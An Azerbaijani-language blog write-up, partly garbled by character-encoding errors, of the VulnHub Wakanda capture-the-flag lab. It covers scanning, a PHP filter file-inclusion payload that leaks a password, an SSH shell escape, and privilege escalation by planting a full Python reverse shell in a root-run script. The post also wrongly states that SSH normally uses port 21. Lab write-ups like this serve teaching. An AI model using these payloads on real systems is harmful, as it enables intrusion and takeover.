---
layout: post
title: Virtual Box 
published: False
---

**Wakanda.ova y√ºkl…ôm…ô [linki](https://www.vulnhub.com/entry/wakanda-1,251/)**

Salam h…ôrk…ôs…ô

Bu, √ß…ôtin VM deyil v…ô yaradƒ±cƒ± t…ôr…ôfind…ôn orta s…ôviyy…ôli olaraq sƒ±ralanƒ±r. Bel…ôlikl…ô, bu yazƒ± yeni ba≈ülayanlar v…ô …ôlb…ôtt…ô hackerlik v…ô pentestinq haqqƒ±nda daha √ßox √∂yr…ônm…ôk ist…ôy…ônl…ôr √º√ß√ºnd√ºr. Siz…ô lazƒ±m olan t…ôk ≈üey Wakanda VM v…ô Kali Linux-dur

![Wakanda](https://i.imgur.com/0ViToK8.png)

- Qeyd: A√ßƒ±qlama hiss…ôsin…ô n…ôz…ôr salsaq g√∂r…ôrik ki 3 d…ôn…ô flag-imiz var.

- ƒ∞lk olaraq .ova faylƒ±nƒ± y√ºkl…ôyib [Virtualbox](https://www.virtualbox.org/) il…ô a√ßƒ±rƒ±q

- Kali linux v…ô Wakanda VM eyni ≈ü…ôb…ôk…ôy…ô (Nat Networka ayarlayƒ±rƒ±q)

![Wakanda1](https://i.imgur.com/jqnq1qN.png)
![Wakanda2](https://i.imgur.com/ZMvQRwr.png)

- Daha sonra is…ô VM-nƒ± i≈ü…ô salƒ±rƒ±q

![Wakanda3](https://i.imgur.com/s4Uu6ta.png)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo netdiscover -r 192.168.100.0/24
```
> Bunu nmap vasit…ôsil…ôd…ô ed…ô bil…ôrsiniz

- netdiscover -d…ôn istifad…ô ed…ôr…ôk Wakanda-nƒ±n ip adresini tapƒ±rƒ±q.

```                                                                                                   
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------                                                                                            
 192.168.100.28       08:00:27:08:80:9d      4     240  PCS Systemtechnik GmbH
```
- ƒ∞P-192.168.100.28
- A√ßƒ±q portlar v…ô i≈ül…ôy…ôn xidm…ôtl…ôr haqqƒ±nda m…ôlumat …ôld…ô etm…ôk √º√ß√ºn nmap istifad…ô ed…ôr…ôk tam portscana ba≈ülayaq.

```
‚îå‚îÄ‚îÄ(rootüíÄkali)-[/home/kali]
‚îî‚îÄ# nmap -sS -sV -A -p- 192.168.100.28
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-20 11:03 EST
Nmap scan report for 192.168.100.28
Host is up (0.0023s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Vibranium Market
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37624/udp6  status
|   100024  1          37669/tcp6  status
|   100024  1          50586/tcp   status
|_  100024  1          59892/udp   status
3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
50586/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:08:80:9D (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   2.30 ms 192.168.100.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.27 seconds
```

- A√ßƒ±q port v…ô i≈ül…ôy…ôn xidm…ôtl…ôr var. 80 n√∂mr…ôli portda Apache web serveri, 3333 n√∂mr…ôli portda OpenSSH serveri v…ô RPC il…ô i≈ül…ôy…ôn portlar var.(Bunlarƒ± bir qƒ±raƒüa qeyd ed…ôk)

- Daha sonra is…ô [Gobuster](https://github.com/OJ/gobuster)-d…ôn istifad…ô ed…ôr…ôk directoryl…ôri axtaraq.

```
‚îÄ‚îÄ(rootüíÄkali)-[/home/kali]
‚îî‚îÄ# gobuster dir -u http://192.168.100.28 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.28
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2022/01/20 11:39:12 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1527]
/fr.php               (Status: 200) [Size: 0]   
/admin                (Status: 200) [Size: 0]   
/backup               (Status: 200) [Size: 0]   
/shell                (Status: 200) [Size: 0]   
/secret               (Status: 200) [Size: 0]   
/secret.txt           (Status: 200) [Size: 40]  
/troll                (Status: 200) [Size: 0]   
/server-status        (Status: 403) [Size: 297] 
/hahaha               (Status: 200) [Size: 0]   
/hohoho               (Status: 200) [Size: 0]   
                                                
===============================================================
2022/01/20 11:51:05 Finished
===============================================================
```

- Web sayta n…ôz…ôr salaq.

> Yaddan √ßƒ±xarmayƒ±n ki saytda h…ôr bir m…ôlumat bizim √º√ß√ºn ipucudur. M…ôn bir notpad il…ô nmap portscan v…ô ya dig…ôr m…ôlumatlarƒ± h…ôm√ßinin saytda qar≈üƒ±ma √ßƒ±xan m…ôlumatlarƒ± qeyd aparƒ±ram.

![Wakanda4](https://i.imgur.com/iq3VXBQ.png)

- Saytƒ±n a≈üaƒüƒ± hiss…ôsind…ô `mamadou` yazƒ±lƒ±b bu h…ôr hansƒ±sa bir istifad…ô√ßi adƒ± ola bil…ôr bunu qƒ±raqda qeyd ed…ôk.

- Veb saytƒ±n HTML kodlarƒ±na n…ôz…ôr salaq.
> CTRL+U

![Wakanda5](https://i.imgur.com/8lvUcp3.png)

- ≈û…ôrh edilmi≈ü bir kod var. Bu, saytƒ±n dilini Fransƒ±z dilin…ô d…ôyi≈üdirm…ôk √º√ß√ºnd√ºr, lakin vebsaytda g√∂r√ºnm√ºr.

- Saytƒ±n URL hiss…ôsin…ô `?lang=fr` …ôlav…ô edirik 

![Wakanda6](https://i.imgur.com/ZDJDPxq.png)

- G√∂rd√ºy√ºn√ºz kimi m…ôzmunun bir hiss…ôsi indi fransƒ±z dilind…ô g√∂st…ôrilir.

- Bunu g√∂rd√ºkd…ô aƒülƒ±ma ilk olaraq Directory Traversal bo≈üluƒüu ola bil…ôc…ôyi g…ôldi v…ô bir ne√ß…ô payload yoxladƒ±m alƒ±nmadƒ±, bir q…ôd…ôr d…ô ara≈üdƒ±rdƒ±m v…ô [LFI / RFI using PHP wrappers](https://book.hacktricks.xyz/pentesting-web/file-inclusion#base64-and-rot13) dey…ô bir bo≈üluq tapdƒ±m.

- ƒ∞lk olaraq linki bu halda daxil ed…ônd…ô d…ôyi≈üiklik olmur daha sonra is…ô

```
http://192.168.100.28/?lang=php://filter/convert.base64-encode/resource=index.php
```
- Sonda olan `.php` uzantƒ±sƒ±nƒ± silib yoxladƒ±m v…ô boom! :D

```
http://192.168.100.28/?lang=php://filter/convert.base64-encode/resource=index
```
- Bel…ô bir base64 il…ô encode edilmi≈ü m…ôtn …ôld…ô edirik bunu decode etm…ôk √º√ß√ºn google-a base64 decode yazƒ±b daha sonra qar≈üƒ±nƒ±za √ßƒ±xan bir saytdan asanlƒ±qla decode ed…ô bil…ôrsiniz.

![Wakanda7](https://i.imgur.com/DwK5yy8.png)

```
PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=
```

- Decode ed…ônd…ôn sonra bir m…ôtn …ôld…ô deirik. Burda bir password yazƒ±lƒ±b.

![Wakanda8](https://i.imgur.com/pLeVzeJ.png)

```
<?php
$password ="Niamey4Ever227!!!" ;//I have to remember it

if (isset($_GET['lang']))
{
include($_GET['lang'].".php");
}
```

- Ssh portunun a√ßƒ±q olduƒüunu bilirik v…ô sayta daxil olanda mamadou adƒ± il…ô qar≈üƒ±la≈ümƒ±≈üdƒ±q 

> normalda SSH 21 portunda i≈ül…ôyir amma nmap il…ô scan ed…ônd…ô SSH 3333 portunda i≈ül…ôdiyini g√∂rd√ºk. 

- SSH portuna baƒülanmaƒüa √ßalƒ±≈üaq.

![Wakanda9](https://i.imgur.com/b0DXoHM.png)

- Baƒülantƒ± alƒ±ndaƒ± v…ô ls,  ls-la …ômrl…ôrini icra etdikd…ô x…ôta yazƒ±sƒ± alƒ±rƒ±q. Bu x…ôta python x…ôta kodudur. Bizi Python p…ônc…ôr…ôsi qar≈üƒ±ladƒ±, d…ôqiql…ô≈üdirm…ôk √º√ß√ºn bir ne√ß…ô Python kodu yazƒ±b yoxlayaq.

- Python kodu yazƒ±b da yoxladƒ±m h…ôm√ßinin fikir verin ssh il…ô qo≈üulduqdan sonra python yazƒ±sƒ±nƒ± da var.

![Wakanda10](https://i.imgur.com/9pJRryA.png)


- Bu Python kodu il…ô shell a√ßmaq m√ºmk√ºnd√ºr.

![Wakanda11](https://i.imgur.com/qwklLNw.png)

```
import pty 

pty.spawn("/bin/bash")
```
- G√∂rd√ºy√ºn√ºz kimi artƒ±q bir shell-imiz var

V…ô flaq-1 …ôld…ô etdik.

![Wakanda12](https://i.imgur.com/vtrrnvn.png)

```
Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc
```
- ƒ∞ndi is…ô flag2.txt axtaraq

![Wakanda13](https://i.imgur.com/hUqiVHc.png)

- G√∂rd√ºy√ºn√ºz kimi flag2-ni tapdƒ±q v…ô oxuma s…ôlahiyy…ôtimiz yoxdur bunun √º√ß√ºn Privillage Escalation (imtiyazlarƒ±n artƒ±rƒ±lmasƒ±  :D ) etm…ôliyik bunun √º√ß√ºn √∂z√ºm√ºz manual olaraq da axtara bil…ôrik v…ô ya tool-lar il…ô d…ô ed…ô bil…ôrik.

- ls -la istifad…ô etdik b…ôyaq g√∂rd√ºk ki devops istifad…ô√ßisinin h…ômin faylƒ± oxuya bilir.

```
find / -user devops
```
- Bu kod il…ô biz devops istifad…ô√ßisin…ô aid fayllarƒ± tapa bil…ôrik. 
- Bunu tapmaq hansƒ± i≈üimiz…ô yara bil…ôr?
- ∆èg…ôr bunlardan hansƒ±nƒ±sa istifad…ô ed…ô bils…ôk onun vasit…ôsil…ô biz Privillage Escalation ed…ô bil…ôrik.

![Wakanda14](https://i.imgur.com/OhnpROg.png)

- √áoxunda `Permission denied` yazƒ±b ancaq ilk ba≈üda olan `/srv/.antivirus.py` v…ô `/tmp/test` fayllarƒ±nda is…ô yox.
 - ∆èg…ôr biz `mamadou` istifad…ô√ßisi olaraq bu 2 fayldan birini i≈ü…ô sala biliriks…ô Reverse Shell v…ô ya ba≈üqa da n…ôl…ôrs…ô ed…ô bil…ôrik.


- ƒ∞lk olaraq `/tmp/test` bu faylƒ±n n…ô olduƒüuna baxaq.

![Wakanda15](https://i.imgur.com/zaAHoLV.png)

- Sal…ôc…ô test yazƒ±lƒ±r. Dig…ôr fayla n…ôz…ôr salaq.

```
cat /srv/.antivirus.py
```

![Wakanda16](https://i.imgur.com/mtH5XvZ.png)


- Bu fayl i√ß…ôrisind…ô 1 s…ôtir kod var v…ô bu kod (yazmaq √º√ß√ºn) `/tmp/test` faylƒ±nƒ± a√ßƒ±r v…ô i√ß…ôrisin…ô test yazƒ±r. Bu √ßox ehtimal ki, i≈ü…ô salƒ±nƒ±b √ß√ºnki biz b…ôyaq baxanda test yazƒ±lmƒ±≈üdƒ±.



 - ƒ∞ndi is…ô `.antivirus.py` faylƒ±nƒ±n i√ßin…ô reverse shell …ôlav…ô ed…ôc…ôyik.
 - Nano il…ô faylƒ± a√ßƒ±b kodu i√ß…ôrisin…ô …ôlav…ô edirik. (internetd…ô Python reverse shell cheet sheet yazaraq sizd…ô bunun kimi kod reverse shell kodu tapa bil…ôrsiniz.)

- Bu saytda bir √ßox dild…ô istifad…ô edil…ôn Reverse shell-l…ôr var [sayt link](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("0.0.0.0",1234))    ///burada olan 0.0.0.0 yerin…ô √∂z lokal ip adresinizi yazƒ±n
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

- Daha sonra is…ô dig…ôr bir p…ônc…ôr…ôd…ô netcat il…ô (v…ô ya metasplotable il…ô d…ô ed…ô bil…ôrik) 1234 portunu dinl…ôm…ôy…ô alƒ±rƒ±q.
```
nc -nvlp 1234
```

- G√∂rd√ºy√ºn√ºz kimi Reverse shell baƒülantƒ±sƒ± alindi amma yen…ô d…ô `mamadou` istifad…ô√ßisi kimi g√∂r√ºn√ºr 

![wakanda17](https://i.imgur.com/tozVWfR.jpg)

- CTRL+C edib yenid…ôn dinl…ôm…ôy…ô alaq.
> S√∂z√ºn d√ºz√º bir ne√ß…ô yol yoxladƒ±m reboot etm…ôy…ô √ßalƒ±≈üdƒ±m v…ô ya ba≈üqa yollar v…ô nec…ôs…ô reverse shell yenid…ôn baƒülandƒ±.

![wakanda18](https://i.imgur.com/aadI6vy.jpg)

- √áox ehtimal ki, bu arxa fonda nec…ôs…ô h…ôr 1d…ôq bir √∂z √∂z√ºn…ô i≈ü…ô salƒ±nƒ±r.

- Y…ôqin ki, bizim i≈üimiz reverse shell yazdƒ±qdan sonra sad…ôc…ô dinl…ôm…ôy…ô alƒ±b g√∂zl…ôm…ôkimi≈ü.


ƒ∞ndi is…ô flag2.txt oxuya bil…ôrik.

![wakanda19](https://i.imgur.com/HYX0Y9M.jpg)

ƒ∞ndi is…ô `root` olmalƒ±yƒ±q.